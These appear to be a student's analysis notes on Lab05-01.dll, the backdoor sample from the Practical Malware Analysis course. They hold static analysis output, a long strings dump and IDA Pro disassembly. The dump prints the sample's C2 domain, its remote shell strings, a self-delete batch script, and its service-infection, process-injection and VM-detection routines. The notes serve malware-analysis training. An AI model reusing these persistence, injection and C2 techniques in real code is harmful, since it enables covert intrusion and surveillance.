Lab05-01.dll
    PE Analysis
        # Virustotal
            61/71
            SHA-256: eb1079bdd96bc9cc19c38b76342113a09666aad47518ff1a7536eebff8aadb4a

        # PEid
            Microsoft Visual C++ 6.0 DLL

        # PEview
            TimeStamp (IMAGE_FILE_HEADER): 2008/06/09 Mon 12:49:29 UTC
            Subsystem (IMAGE_OPTIONAL_HEADER): IMAGE_SUBSYSTEM_WINDOWS_GUI (Graphic)
            Sections (Virtual Size / Size of Raw Data) -> No Packed
                .text: 14306/14400
                .rdata: 2039/2200
                .data: 79E64/4A00
                xdoors_d: 2C5E/2E00             // ?
                .rsrc: 3B0/400
                .reloc: 24AB/2600
        
        # Dependency Walker
            GDI32.DLL
                BitBlt
                CreateCompatibleBitmap
                CreateCompatibleDC
                CreateDCA
                CreateDIBSection
                CreateFontIndirectA
                DeleteDC
                DeleteObject
                GetDIBits
                GetDeviceCaps
                GetObjectA
                GetStockObject
                RealizePalette
                SelectObject
                SelectPalette
                SetBkMode
                SetTextColor
            PSAPI.DLL
                EnumProcessModules
                GetModuleFileNameExA
            WS2_32.DLL
            IPHLPAPI.DLL
                GetAdaptersInfo
            KERNEL32.DLL
                CloseHandle
                CopyFileA
                CreateDirectoryA
                CreateFileA
                CreateMutexA
                CreatePipe
                CreateProcessA
                CreateRemoteThread
                CreateThread
                CreateToolhelp32Snapshot
                DeleteFileA
                EnterCriticalSection
                ExitThread
                FindClose
                FindFirstFileA
                FindNextFileA
                FreeConsole
                FreeLibrary
                GetComputerNameA
                GetCurrentDirectoryA
                GetCurrentProcess
                GetCurrentProcessId
                GetCurrentThreadId
                GetDiskFreeSpaceA
                GetDriveTypeA
                GetExitCodeThread
                GetFileAttributesA
                GetFileTime
                GetLastError
                GetLocalTime
                GetLogicalDrives
                GetModuleFileNameA
                GetModuleHandleA
                GetProcAddress
                GetStartupInfoA
                GetStdHandle
                GetSystemDefaultLangID
                GetSystemDirectoryA
                GetSystemTime
                GetTickCount
                GetVersion
                GetVersionExA
                GetVolumeInformationA
                GetWindowsDirectoryA
                GlobalAlloc
                GlobalFree
                GlobalLock
                GlobalMemoryStatus
                GlobalReAlloc
                GlobalSize
                GlobalUnlock
                InitializeCriticalSection
                LeaveCriticalSection
                LoadLibraryA
                LoadLibraryW
                LocalAlloc
                LocalFree
                Module32First
                Module32Next
                MoveFileA
                MoveFileExA
                MultiByteToWideChar
                OpenProcess
                OutputDebugStringA
                Process32First
                Process32Next
                ProcessIdToSessionId
                ReadFile
                RemoveDirectoryA
                ResumeThread
                SetCurrentDirectoryA
                SetFileAttributesA
                SetFileTime
                SetLastError
                SetPriorityClass
                Sleep
                SuspendThread
                SystemTimeToFileTime
                TerminateProcess
                TerminateThread
                Thread32First
                Thread32Next
                VirtualAllocEx
                VirtualQuery
                WaitForSingleObject
                WideCharToMultiByte
                WinExec
                WriteFile
                WriteProcessMemory
            USER32.DLL
                BlockInput
                CloseDesktop
                CloseWindowStation
                DrawTextA
                ExitWindowsEx
                GetDC
                GetDesktopWindow
                GetMessageA
                GetProcessWindowStation
                GetSystemMetrics
                GetThreadDesktop
                GetUserObjectInformationA
                MessageBoxA
                OpenDesktopA
                OpenInputDesktop
                OpenWindowStationA
                PostMessageA
                PostThreadMessageA
                RedrawWindow
                ReleaseDC
                SendMessageA
                SetProcessWindowStation
                SetThreadDesktop
                SystemParametersInfoA
                keybd_event
                mouse_event
            ADVAPI32.DLL
                AdjustTokenPrivileges
                ChangeServiceConfig2A
                ChangeServiceConfigA
                CloseServiceHandle
                ControlService
                CreateProcessAsUserA
            OLE32.DLL
                CoCreateInstance
                CoInitialize
                CoInitializeEx
                CoTaskMemFree
                CoUninitialize
            OLEAUT32.DLL
            MSVFW32.DLL
                ICClose
                ICCompress
                ICImageCompress
                ICOpen
                ICSendMessage
            WINMM.DLL
                waveInAddBuffer
                waveInClose
                waveInOpen
                waveInPrepareHeader
                waveInReset
                waveInStart
                waveInUnprepareHeader
            MSVCRT.DLL
                

        # strings.exe (Only part of the results)
            &MH
            xdll.dll
            InstallRT
            InstallSA
            InstallSB
            PSLIST
            ServiceMain
            StartEXS
            UninstallRT
            UninstallSA
            UninstallSB
            [This is PWD]                                                                 
            [This is RGP]                                                                 
            [This is RNA]pics
            [This is RUR]
            [This is RDO]pics.praticalmalwareanalysis.com
            [This is RIP]                                                                 
            [This is RPO]80
            [This is DVM]      
            [This is SS2]      
            [This is SSD]      
            [This is LOG]0
            
            [This is NTI]30
            [This is CTI]30
            /ek
            .PAX
            .PAD
            .?AV_com_error@@
            warning LSP High 
            warning LSP Low 
            .?AVtype_info@@
            -1::'u<&u!=<&u746>1::'yu&!'<;2u106:101u3:'u
            '46!<649u
            49"4'0u
            ;49,&<&u
            47uo|dgfa
            rundll64.exe
            rundll32.exe
            ipconfig /flushdns
            Plug_KeyLog_Main
            plug_keylog
            Plug_Proxy_Main
            xproxy.dll
            plug_proxy
            Plug_Flood_StopMain
            plug_stopflood
            PluG_Flood_Main
            xflood.dll
            plug_flood
            Plug_Acq_Main
            xacq.dll
            plug_acq
            Plug_Dev_Main
            xdev.dll
            plug_dev
            Plug_Sys_Main
            xsys.dll
            plug_sys
            update
            logoff
            shutdown
            reboot
            fgets
            message
            startxservices
            startxprocess
            startxsound
            startxvideo
            startxreg
            startxfile
            startxscreen
            startxcmd
            uninstall
            uninstall+reboot
            suspendx
            urlh
            urln
            exeh
            exen
            delgroupinfo
            setgroupinfo
            delhostinfo
            sethostinfo           
            socket() GetLastError reports %d
            Plug_KeyLog_Restart
            xkey.dll
            WSAStartup() error: %d
            wb+
            125
            150
            RETR %s
            227
            PASV
            213
            SIZE %s
            TYPE I
            250
            CWD %s
            230
            PASS %s
            331
            USER %s
            Socket error....
            IEuser@
            anonymous
            FTP://                                                              // !
            ftp://                                                              // !
            Content-Length:
            HTTP/1.1 5
            HTTP/1.1 3
            HTTP/1.1 4
            Expires: 0
            Cache-Control: no-cache, must-revalidate
            Pragma: no-cache
            Connection: Keep-Alive
            User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1)
            Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
            Host: 
            HTTP/1.1
            GET 
            HTTP://
            http://
            GetLastInputInfo
            user32.dll
            [%s %s]
            xinstall.log
            AdjustTokenPrivileges
            LookupPrivilegeValue
            SeDebugPrivilege
            error on %s, error code %d. 
            OpenProcessToken
            0.0.0.0
            Microsoft TV/Video Connection
            VMware Virtual Ethernet Adapter
            Fail To Send()
            %s %s
            ftp:////
            http:////
            SeShutdownPrivilege
            HardwareInformation.MemorySize
            System
            \Device\Video0
            HARDWARE\DEVICEMAP\VIDEO
            F333
            kernel32.dll
            GetDiskFreeSpaceExA
            ~MHz
            HARDWARE\DESCRIPTION\System\CentralProcessor\0
            default
            GroupInfo
            HostInfo
            SOFTWARE\Microsoft\Windows\CurrentVersion
            Fail To Create Snap Shot
            (1) Enter Current Directory Error,Update Failed
            (2) Get DLL FileName Error,Update Failed
            (3) Move '%s' To '%s' Failed,Perhaps Other Process Updateing|Updated Same Module
            (4) Resume '%s' To '%s' Failed,Update Failed
            (4) Resume '%s' To '%s' Successfully,Update Failed
            (4) Get New FileName Error,Update Failed
            (6) Update Successfully,Will Take Effect Until Next Reboot
            (5) New FileName As Old FileName
            (6) Resume '%s' To '%s' Successfully,Update Failed!!!
            (5) Move '%s' To '%s' Failed,Update Failed
            (5) Copy '%s' To '%s' Successfully
            (4) Get New FileName '%s'
            (3) Move '%s' To '%s' Successfully
            .ubak
            (2) Get DLL FileName '%s'
            (1) Enter Current Directory '%s'
            ******************************
            [BackDoor Server Update Setup]                                          // !
            ******************************
            -warn
            -erro
            -stop
            -shutdown
            -reboot
            Default
            WinSta0
            winsta0\default
            EXPLORER.EXE
            %s\IEXPLORE.EXE
            Path
            SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE
            [Machine IdleTime:] %d days + %.2d:%.2d:%.2d
            [Machine UpTime:] %-.2d Days %-.2d Hours %-.2d Minutes %-.2d Seconds
            [Language:] id:0x%x
            [Install Log:] %d
            [Detect VM  :] %d
            [SSDT Ring3 :] %d
            [SSDT Ring0 :] %d
            [Host connect Type  :] %d
            [Host Reconnect Time:] %d
            [CURL Reconnect Time:] %d
            [DOMAIN_NAME:] 
            [CURL       :] 
            [HOST_NAME  :] 
            [PASS       :] 
            [PORT       :] 
            [HOST       :] 
            [Module:] 
            [Masthost:] %s:%s
            [Robot_WorkTimes:] %d
            WorkTimes
            [Robot_WorkTime :] %d
            WorkTime
            ServiceDll
            SYSTEM\CurrentControlSet\Services\%s\Parameters\
            SYSTEM\CurrentControlSet\Services\
            del %%0
            if exist "%s" goto selfkill
            del "%s"
            attrib -a -r -s -h "%s"
            :selfkill
            @echo off
            .\vmselfdel.bat
            kstarttype
            CreateToolhelp32Snapshot
            OpenProcess
            WaitForSingleObject
            CreateRemoteThread
            failed
            Load the sfc fuction failed
            unsupported version
            Windows XP
            sfc_os.dll
            Win2000
            sfc.dll
            error on get process info. 
            winlogon.exe
            xinstall.dll
            AdjustTokenPrivileges failed: %u
            LookupPrivilegeValue error:%d
            ntdll.dll
            NtQuerySystemInformation
            %-16d%-20s%d
            [%s]
            ProcessID       ProcessName         ThreadNumber
            Process32First() Fail:Error %d
            [%s]
            %-16d%-20s%d
            CreateToolhelp32Snapshot Fail:Error%d
            OpenProcessToken Error: %d
            kernel32
            OpenThread
            smss.exe
            csrss.exe
            lsass.exe
            services.exe
            svchost.exe
            Winlogon
            winsta0
            WmsgSendMessage
            wmsgapi.dll
            DISPLAY
            .scr
            WinSta0\Winlogon
            WinSta0\Default
            logonui.exe
            rundll32.exe %s,StartEXS %s:%s
            explorer.exe
            %s\
            %s%s
            %s\%s
            *.*
            1234567890
            %s
            System Volume Information
            %s*.*
            HKEY_USERS
            HKEY_LOCAL_MACHINE
            HKEY_CURRENT_USER
            HKEY_CURRENT_CONFIG
            HKEY_CLASSES_ROOT
            FriendlyName
            Grabber
            Capture Filter
            AudioInThreadProc exit.
            MM_WIM_CLOSE 
            AudioInThreadProc start.
            CWaveIn::CloseDev: Device hasn't opened.
            CWaveIn::OpenDev: waveInOpen error.
            CWaveIn::OpenDev: Device has open.
            CWaveIn::StartThread: Strat wave in thread fail.
            CWaveIn::StartThread: Wave in thread has run.
            CWaveIn::StopThread: TerminateThread wave in thread.
            CWaveIn::StopThread: Wave in thread hasn't run.
            CWaveIn::PerPareBuffer: waveInAddBuffer error.
            CWaveIn::PerPareBuffer: waveInPrepareHeader error.
            CWaveIn::PerPareBuffer: waveInReset error.
            CWaveIn::PerPareBuffer: Buffer has been alloc.
            CWaveIn::FreeBuffer: waveInUnprepareHeader error.
            CWaveIn::FreeBuffer: m_pHdr is NULL.
            CWaveIn::FreeBuffer: Buffer hasn't been alloc.
            CWaveIn::OpenRecord: waveInStart error.
            CWaveIn::OpenRecord: You may be has begun recored.
            CWaveIn::CloseRecord: waveInReset error.
            CWaveIn::CloseRecord: Device hasn't opened.
            CWaveIn::CloseRecord: You may be hasn't begun recored.
            Completed
            SoftWare\MicroSoft\Internet Connection Wizard\
            MyStarService() -> OpenService() Error
            MyStarService() -> StartService() Error.
            StartService '%s' Successfully
            Open SCM error!
            MyStopService() -> OpenService() Error.
            MyStopService() -> ControlService() Error
            StopService '%s' Successfully
            Service '%s' Status already is Stopped.
            MyChangeService() -> OpenService '%s' Error.
            Change Service '%s' To Be Disabled
            Change Service '%s' To Be Manual-Start
            Change Service '%s' To Be Auto-Start
            Change Service '%s' Config Failed!
            Query registry service config failed!
            Alloc memory failed!
            Service '%s' Start Type Already Is Auto
            MyQueryServiceStarttype() -> OpenService '%s' Error.
            Query service starttype->%d
            _ox.dll
            .obak
            regedit.exe
            mmc.exe
            WatchServcicsMExeMutex
            GetModuleFileName() get dll path
            Kernel32
            LoadLibraryW
            Not Found Module '%s' In Any '%s' Process
            Found Module '%s' In PID %d
            Process '%s' Not Found ,Inject Failed
            Inject '%s' To Process '%s' Failed
            Inject '%s' To Process '%s' Successfully
            The PID Of Process '%s' is '%d'
            iexplore.exe
            Copy '%s' To '%s' Failed
            Copy '%s' To '%s' Successfully
            The PID Of Process '%s' Not Found
            Inject '%s' To Process '%s' Failed
            Inject '%s' To Process '%s' Successfully
            The PID Of Process '%s' is '%d'
            Copy '%s' To '%s' Failed
            Copy '%s' To '%s' Successfully
            Found Virtual Machine,Install Cancel.
            Description
            SYSTEM\ControlSet001\Services\
            win.ini
            Config service %s ok.
            %s error %d
            RegSetValueEx(ServiceDll)
            %SystemRoot%\system32\
            RegCreateKey(Parameters)
            Parameters
            RegOpenKeyEx(%s) KEY_SET_VALUE error %d.
            CreateService(%s) With Description '%s' SUCCESS. Config it
            CreateService(%s) error %d
            %SystemRoot%\System32\svchost.exe -k netsvcs
            OpenSCManager()
            Now Will Install Default Service '%s' With Description '%s' 
            - %s
            you specify service name not in Svchost\netsvcs, must be one of following:
            RegQueryValueEx(Svchost\netsvcs)
            netsvcs
            RegOpenKeyEx(%s) KEY_QUERY_VALUE error %d.
            SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
            %s System Services
            Irmon
            Replace Old Service '%s' Failed,Install Cancle
            Old Module Not Runing,New ModuleName As Old,Will Take Effect Soon.
            Old Module Have Been Free,New ModuleName As Old,Will Take Effect Soon.
            %s.obak
            %s\dllcache\%s
            Inject '%s' to  PID '%d' Successfully!
            Old Module '%s' Still Runing,New Module '%s' Will Inject To PID '%d'
            Service '%s' Infect Successfully
            ServiceDll Set As '%s' Successfully
            ServiceMain Set As 'ServiceMain'
            RegSetValueEx(ServiceMain)
            ServiceMain
            RegQueryValueEx(%s) KEY_SET_VALUE error %d.
            Services '%s' Have Been Infected! Install Failed!
            ServiceMainbak
            \Parameters
            You Specify Service Name Not In Svchost\netsvcs, must be one of following:
            NtmsSvc
            Exception Catched 0x%X
            DeleteService(%s) SUCCESS.
            OpenService(%s) error %d
            OpenSCManager() error %d
            Service '%s' Do Not Need UnInstall.
            Service '%s' UnInstall Falied 2.
            Service '%s' UnInstall Falied 1.
            Service '%s' UnInstall Successfully,Please Reboot Machine To Take Effect
            ServiceMain Reset to '%s'
            Move '%s' To '%s' Successfully
            .\dllcache\%s
            %s.pbak
            ServiceDll Reset to '%s'
            .dll
            _ox
            Kernel32.dll
            FreeLibrary
            Process '%s' Not Found,Uninject Failed
            Uninject '%s' From Process '%s' Failed
            Uninject '%s' From Process '%s' Failed, Module '%s' Not Found
            Uninject '%s' From Process '%s' Successfully
            '%s' Repair Failed,Bak File Lose!
            '%s' Repair Successfully,Need Reboot Machine!
            Move '%s' To '%s' Failed
            _bd.dll
            .pe
            conime.exe
            MayBe Inject Mode,You Only Need Close Master Process '%s' To Uninatll This Mode
            No Found Old Bak Pe File->'%s' 
            Now Run UninstallPE %s
            Found Old Bak Pe File->'%s' 
            Get MasterProecss Path->'%s'
            Now Run UninstallSB %s
            Now Run UninstallSA %s
            Get ServiceName->'%s'
            Get ProcessName->'%s'
            Get ModuleName->'%s'
            Get ModulePath->'%s'
            Get Install Way->InstallRT
            Get Install Way->InstallPE
            Get Install Way->InstallSB Or InstallRSB
            Get Install Way->InstallSA
            Get ServiceName->'%s'
            Get ProcessName->'%s'
            Get ModuleName->'%s'
            Get ModulePath->'%s'
            CreateProcess() GetLastError reports %d
            inject
            minstall
            mmodule
            mhost
            mbase
            robotwork
            language
            uptime
            idle
            0x%02x
            enmagic
            exit
            quit
            \command.exe /c                                                     //!
            \cmd.exe /c                                                         // !
            Hi,Master [%d/%d/%d %d:%d:%d]
            WelCome Back...Are You Enjoying Today?
            Machine UpTime  [%-.2d Days %-.2d Hours %-.2d Minutes %-.2d Seconds]
            Machine IdleTime [%-.2d Days %-.2d Hours %-.2d Minutes %-.2d Seconds]
            Encrypt Magic Number For This Remote Shell Session [0x%02x]
            VS_VERSION_INFO
            StringFileInfo
            080404b0
            CompanyName
            Microsoft Corporation
            FileDescription
            File Encryption Utility
            FileVersion
            5.1.2201.1329
            InternalName
            X-doorc                                                             // !
            LegalCopyright
            (C) Microsoft Corporation. All rights reserved.
            OriginalFilename
            ProductName
            Microsoft(R) Windows(R) Operating System
            ProductVersion
            5.1.2201.1329
            VarFileInfo
            Translation

        # Resource Hacker
            1 VERSIONINFO
            FILEVERSION 5,1,2201,1329
            PRODUCTVERSION 5,1,2201,1329
            FILEOS 0x40004
            FILETYPE 0x2
            {
            BLOCK "StringFileInfo"
            {
                BLOCK "080404b0"
                {
                    VALUE "CompanyName", "Microsoft Corporation"
                    VALUE "FileDescription", "File Encryption Utility"
                    VALUE "FileVersion", "5.1.2201.1329"
                    VALUE "InternalName", "X-doorc"
                    VALUE "LegalCopyright", "(C) Microsoft Corporation. All rights reserved."
                    VALUE "ProductName", "Microsoft(R) Windows(R) Operating System"
                    VALUE "ProductVersion", "5.1.2201.1329"
                }
            }

            BLOCK "VarFileInfo"
            {
                VALUE "Translation", 0x0804 0x04B0  
            }
            }

    Dynamic Analysis
        # RegShot (Part of results)
            Cannot use rundll32.exe to run Lab05-01.dll

        # procexp (View > Lower Pane View > DLLS / Handles)
            NULL

        # procmon
            NULL

        # ApateDNS
            NULL

        # IDA Pro
            DLLMain: 0x1000D02E

            gethostbyname: 0x100163CC
            
            Ctrl+x on gethostbyname
                18 Lines -> p type: 9 -> 9 calls on gethostbyname()
            
            G, input 0x10001757
                .text:1000174E                 mov     eax, off_10019040
                [This is RDO]pics.praticalmalwareanalysis.com
                    .text:10001753                 add     eax, 0Dh                     //  13
                    .text:10001756                 push    eax             ; name
                    .text:10001757                 call    ds:gethostbyname
                        >>> len('[This is RDO]')
                        13
            
            G, input 0x10001656
                #local variables: 23
                #parameters: 1                  // .text:10001656 ; DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)
            
            \cmd.exe /c: 0x10095B34
            
            Remote shell calls
                xdoors_d:10095B44 ; char aHiMasterDDDDDD[]
                xdoors_d:10095B44 aHiMasterDDDDDD db 'Hi,Master [%d/%d/%d %d:%d:%d]',0Dh,0Ah
                xdoors_d:10095B44                                         ; DATA XREF: sub_1000FF58+145↑o
                xdoors_d:10095B44                 db 'WelCome Back...Are You Enjoying Today?',0Dh,0Ah
                xdoors_d:10095B44                 db 0Dh,0Ah
                xdoors_d:10095B44                 db 'Machine UpTime  [%-.2d Days %-.2d Hours %-.2d Minutes %-.2d Secon'
                xdoors_d:10095B44                 db 'ds]',0Dh,0Ah
                xdoors_d:10095B44                 db 'Machine IdleTime [%-.2d Days %-.2d Hours %-.2d Minutes %-.2d Seco'
                xdoors_d:10095B44                 db 'nds]',0Dh,0Ah
                xdoors_d:10095B44                 db 0Dh,0Ah
                xdoors_d:10095B44                 db 'Encrypt Magic Number For This Remote Shell Session [0x%02x]',0Dh,0Ah
                xdoors_d:10095B44                 db 0Dh,0Ah,0

                if ( sub_100038EE(s, (int)&Dst, v8) == -1
                    || sub_100038EE(s, (int)::Buffer, 2) == -1
                    || !memcmp(&Dst, aQuit, 4u)
                    || !memcmp(&Dst, aExit, 4u) )
                {
                    break;
                }
                if ( !memcmp(&Dst, aCd, 2u) )
                {
                    v9 = &PathName;
                }

            G, input 0x100101C8
                Click dword_1008E5C4 > Ctrl+x on dword_1008E5C4
                    Up	w	sub_10001656+22	mov     dword_1008E5C4, eax
                        .text:10001673                 call    sub_10003695
                        .text:10001678                 mov     dword_1008E5C4, eax      // eax is the return value of sub_10003695 function
                            BOOL sub_10003695()
                            {
                            struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-94h]

                            VersionInformation.dwOSVersionInfoSize = 148;
                            GetVersionExA(&VersionInformation);                         // Version
                            return VersionInformation.dwPlatformId == 2;                // dwPlatformId
                            }

                            text:10003695 ; Attributes: bp-based frame
                            .text:10003695
                            .text:10003695 sub_10003695    proc near               ; CODE XREF: sub_10001656+1D↑p
                            .text:10003695                                         ; sub_10003B75+7↓p ...
                            .text:10003695
                            .text:10003695 VersionInformation= _OSVERSIONINFOA ptr -94h
                            .text:10003695
                            .text:10003695                 push    ebp
                            .text:10003696                 mov     ebp, esp
                            .text:10003698                 sub     esp, 94h
                            .text:1000369E                 lea     eax, [ebp+VersionInformation]
                            .text:100036A4                 mov     [ebp+VersionInformation.dwOSVersionInfoSize], 94h
                            .text:100036AE                 push    eax             ; lpVersionInformation
                            .text:100036AF                 call    ds:GetVersionExA
                            .text:100036B5                 xor     eax, eax
                            .text:100036B7                 cmp     [ebp+VersionInformation.dwPlatformId], 2             // Windows 2000 or less
                            .text:100036BE                 setz    al                                                   // modify eax
                            .text:100036C1                 leave
                            .text:100036C2                 retn
                            .text:100036C2 sub_10003695    endp
            
            G, input 0x1000FF58                 // Or search robotwork in Strings window
                .text:1001044C                 push    offset aRobotwork ; "robotwork"
                .text:10010451                 push    eax             ; Buf1
                .text:10010452                 call    memcmp                                       // if comparion is successful then retun 0 in memcmp
                .text:10010457                 add     esp, 0Ch
                .text:1001045A                 test    eax, eax
                .text:1001045C                 jnz     short loc_10010468
                .text:1001045E                 push    [ebp+s]         ; s
                .text:10010461                 call    sub_100052A2                                 // Work!
                .text:10010466                 jmp     short loc_100103F6
                    # sub_100052A2
                    LSTATUS __cdecl sub_100052A2(SOCKET s)                                              // .text:1001045E                 push    [ebp+s]         ; s
                    {
                    ...
                    if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, aSoftwareMicros, 0, 0xF003Fu, &phkResult) )  // HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
                        return RegCloseKey(phkResult);
                    if ( !RegQueryValueExA(phkResult, aWorktime, 0, &Type, &Data, &cbData) )            // HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WorkTime
                    {
                        v2 = atoi((const char *)&Data);
                        sprintf(&Dest, aRobotWorktimeD, v2);
                        v3 = strlen(&Dest);
                        sub_100038EE(s, (int)&Dest, v3);                                                // sub_100038EE
                    }
                    memset(&Data, 0, 0x200u);
                    if ( !RegQueryValueExA(phkResult, aWorktimes, 0, &Type, &Data, &cbData) )           // HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Worktimes
                    {
                        v4 = atoi((const char *)&Data);
                        sprintf(&Dest, aRobotWorktimes, v4);
                        v5 = strlen(&Dest);
                        sub_100038EE(s, (int)&Dest, v5);
                    }
                    return RegCloseKey(phkResult);
                    }
                        # sub_100038EE
                        .text:10003933                 call    ds:send                                  // It may send some RegValue(WorkTime or WorkTimes) to the Socket s
            
            Exports window: PSLIST	10007025	4
                int __userpurge PSLIST@<eax>(char a1@<sil>, int a2, int a3, char *Str, int a5)
                {
                int result; // eax

                dword_1008E5BC = 1;
                result = xp_2000_2003_OR_7_vista();                     // XP/2000/2003 Or 7/Vista
                if ( result )
                {
                    if ( strlen(Str) )
                    result = sub_1000664C(a1, 0, Str);                  // CreateToolhelp32Snapshot
                    else
                    result = sub_10006518();                            // CreateToolhelp32Snapshot
                }
                dword_1008E5BC = 0;
                return result;
                }
                    
            Function name > search sub_10004E79 Or G, input 0x10004E79
                Hightlight sub_10004E79 in IDA View window, View > Graphs > Xrefs from Or Right click on the function name > Xrefs from
                                            sub_10004E79
                    GetSystemDefaultLangID  sprintf sub_100038EE    strlen
                                                        |
                                        send    malloc  free    __imp_strlen
                        sub_10004E79 may be a function to get language and send it to socket. (Rename it sendLanguageID)
            
            Function name > search DLLMain
                View > Graphs > User xrefs chart > Recursion depth: 1 / 2
                1: #7
                2: Too much...
    
            G, input 0x10001358
                .text:10001341                 mov     eax, off_10019020    ; [This is CTI]30
                .text:10001346                 add     eax, 0Dh
                .text:10001349                 push    eax             ; Str
                .text:1000134A                 call    ds:atoi
                .text:10001350                 imul    eax, 3E8h       ; 1000
                .text:10001356                 pop     ecx
                .text:10001357                 push    eax             ; dwMilliseconds
                .text:10001358                 call    ds:Sleep

                30 * 1000 = 30000 -> Sleep(30000 dwMilliseconds) -> Sleep 30s

            G, input 0x10001701
                .text:100016FB                 push    6               ; protocol           // Right click 6 > Symbolic constant > Use standard symbolic constant > IPPROTO_TCP
                .text:100016FD                 push    1               ; type               // SOCK_STREAM
                .text:100016FF                 push    2               ; af                 // AF_INET
                .text:10001701                 call    ds:socket                            // socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            
            Search > sequences of bytes > 0xED, Find all occurrences > .text:100061DB	sub_10006196	in      eax, dx
                .text:100061C7                 mov     eax, 564D5868h           ; R > 'VMXh'
                .text:100061CC                 mov     ebx, 0
                .text:100061D1                 mov     ecx, 0Ah
                .text:100061D6                 mov     edx, 5658h
                .text:100061DB                 in      eax, dx
                    Chect xref of the current function, X on the function name:
                        .text:1000DEE1                 call    sub_10006196
                        .text:1000DEE6                 test    al, al
                        .text:1000DEE8                 jz      short loc_1000DF08
                        .text:1000DEEA
                        .text:1000DEEA loc_1000DEEA:                           ; CODE XREF: InstallSA+1E↑j
                        .text:1000DEEA                 push    offset unk_1008E5F0 ; Format
                        .text:1000DEEF                 call    sub_10003592
                        .text:1000DEF4                 mov     [esp+8+Format], offset aFoundVirtualMa ; "Found Virtual Machine,Install Cancel."

            G, input 0x1001D988
                File > Script File > Lab05-01.py
                    xdoor is this backdoor, string decoded for Practical Malware Analysis Lab :)1234
